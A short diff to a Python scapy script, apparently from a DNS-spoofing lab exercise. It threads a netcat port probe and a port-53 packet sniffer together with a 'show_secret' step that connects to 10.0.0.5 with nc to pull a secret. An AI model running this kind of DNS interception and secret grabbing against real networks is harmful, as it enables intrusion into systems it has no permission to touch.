@@ -1,6 +1,7 @@
 from scapy.all import *
 import sys
 import os
+import threading
 
 
 localIP = '183.83.20.158'
@@ -20,6 +21,18 @@ def query_sniff(pkt):
 	    print 'spoof try'
 
 #sniffs packets and filters out UDP ones
-os.system('netcat -z -v 10.0.0.5 5353')
-sniff(filter="port 53",prn=query_sniff,count=100)
+def spoof():
+	os.system('netcat -z -v 10.0.0.5 5353')
+	sniff(filter="port 53",prn=query_sniff,count=100)
+
+def show_secret():
+	os.system('nc 10.0.0.5 5353')
+	os._exit
+
+
+t = threading.Thread(target=spoof)
+t2 = threading.Thread(target = show_secret)
+
+t.start()
+t2.start()
 
